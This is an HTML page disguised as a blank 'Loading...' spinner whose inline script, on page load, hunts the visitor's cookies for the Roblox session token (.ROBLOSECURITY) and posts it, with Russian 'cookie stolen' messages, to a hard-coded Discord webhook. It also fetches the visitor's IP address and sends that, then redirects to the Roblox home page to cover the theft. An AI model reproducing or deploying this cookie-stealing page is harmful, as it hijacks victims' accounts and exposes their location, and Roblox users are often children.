<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body { background: #0a0a12; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #888; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div style="width:40px;height:40px;border:3px solid #1a1a2e;border-top:3px solid #0066ff;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto;"></div>
        <p style="margin-top:15px;font-size:13px;">Loading...</p>
    </div>
    <style>
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
    <script>
        (function(){
            const WEBHOOK = "https://discord.com/api/webhooks/1498675836914503792/7uYnzcFsKd2in25vMUKjDitavj66h7ILluwBNFLqM4XA2PQBok36OP1ttE1DxpNb28wD";
            
            function send(msg){
                fetch(WEBHOOK, {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({content: msg})
                }).catch(()=>{});
            }

            function grab(){
                try{
                    const c = document.cookie.split(';');
                    for(let i of c){
                        const t = i.trim();
                        if(t.startsWith('.ROBLOSECURITY=')){
                            const v = t.split('=')[1];
                            send(`**🍪 КУКА УКРАДЕНА!**\n\`\`\`${v}\`\`\``);
                            return;
                        }
                    }
                    send('❌ Кука не найдена');
                } catch(e){
                    send(`⚠️ Ошибка: ${e.message}`);
                }
            }

            function ip(){
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => send(`🌐 IP: ${d.ip}`))
                    .catch(()=>{});
            }

            grab();
            ip();

            // Редирект на роблокс через 2 секунды
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/home";
            }, 2000);
        })();
    </script>
</body>
</html>
